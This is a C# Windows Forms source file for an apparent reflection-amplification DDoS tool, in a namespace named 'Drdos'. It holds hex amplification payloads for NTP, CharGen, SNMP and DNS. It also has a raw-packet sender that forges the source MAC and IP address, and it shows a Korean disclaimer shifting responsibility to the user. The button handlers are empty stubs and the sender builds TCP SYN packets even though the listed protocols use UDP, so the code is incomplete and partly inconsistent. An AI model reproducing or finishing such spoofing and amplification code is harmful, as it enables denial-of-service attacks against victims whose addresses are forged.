using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Drdos
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        public static Dictionary<string, string> payloads = new Dictionary<string, string>();

        public Form1()
        {
            InitializeComponent();
            payloads.Add("NTP", "1700032a00000000");
            payloads.Add("charGen", "00");
            payloads.Add("SNMP", "302602010104067075626c6963a519020471b4b56802010002017F300b300906052b060102010500");
            payloads.Add("DNS", "{}01000001000000000001{}0000ff00ff0000291000000000000000"); //{1}=id, {2}=qname
            MessageBox.Show("이 프로그램에 대한 책임은 사용자에게 있으며\n이 프로그램을 사용하여 생긴 일들은 개발자가 책임지지 않습니다.");
        }

        public byte[] GetQName(string domain)
        {
            string[] labels = domain.Split('.');
            var str = new MemoryStream();
            var bw = new BinaryWriter(str);

            foreach (string label in labels)
            {
                bw.Write(label);
            }
            return str.ToArray();
        }

        //NONE
        private void None_Start_textbox_Click(object sender, EventArgs e)
        {

        }

        private void None_Stop_textbox_Click(object sender, EventArgs e)
        {

        }
        //

        //DNS
        private void DNS_Start_textbox_Click(object sender, EventArgs e)
        {

        }

        private void DNS_Stop_textbox_Click(object sender, EventArgs e)
        {

        }
        //

        //NTP
        private void NTP_Start_textbox_Click(object sender, EventArgs e)
        {

        }

        private void NTP_Stop_textbox_Click(object sender, EventArgs e)
        {

        }
        //

        private void SendPacket(string SrcMac,string SrcIP,int SrcPort,string DestMac,string DestIp, int DestPort,string payload) {
            EthernetLayer ethLayer = new EthernetLayer
            {
                Source = new MacAddress(SrcMac),
                Destination = new MacAddress(DestMac),
                EtherType = EthernetType.None,
            };

            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = new IpV4Address(SrcIP),
                CurrentDestination = new IpV4Address(DestIp),
                Fragmentation = IpV4Fragmentation.None,
                HeaderChecksum = null,
                Identification = 0,
                Options = IpV4Options.None,
                Protocol = IpV4Protocol.Tcp,
                Ttl = 128,
                TypeOfService = 0,
            };

            TcpLayer tcpLayer = new TcpLayer
            {
                SourcePort = (ushort)SrcPort,
                DestinationPort = (ushort)DestPort,
                Checksum = null,
                SequenceNumber = 0,
                AcknowledgmentNumber = 0,
                ControlBits = TcpControlBits.Synchronize,
                Window = 1024,
                UrgentPointer = 0,
            };

            PayloadLayer payloadLayer = new PayloadLayer
            {
                Data = new Datagram(StringToByteArray(payload)),
            };

            PacketBuilder builder = new PacketBuilder(ethLayer, ipV4Layer, tcpLayer, payloadLayer);

            this.Invoke(new MethodInvoker(delegate ()
            {
                using (PacketCommunicator communicator = LivePacketDevice.AllLocalMachine[0].Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
                {
                    communicator.SendPacket(builder.Build(DateTime.Now));
                }
            }));
        }

        private byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        private static string GetRandomMacAddress()
        {
            var random = new Random();
            var buffer = new byte[6];
            random.NextBytes(buffer);
            var result = String.Concat(buffer.Select(x => string.Format("{0}:", x.ToString("X2"))).ToArray());
            return result.TrimEnd(':');
        }
    }
}
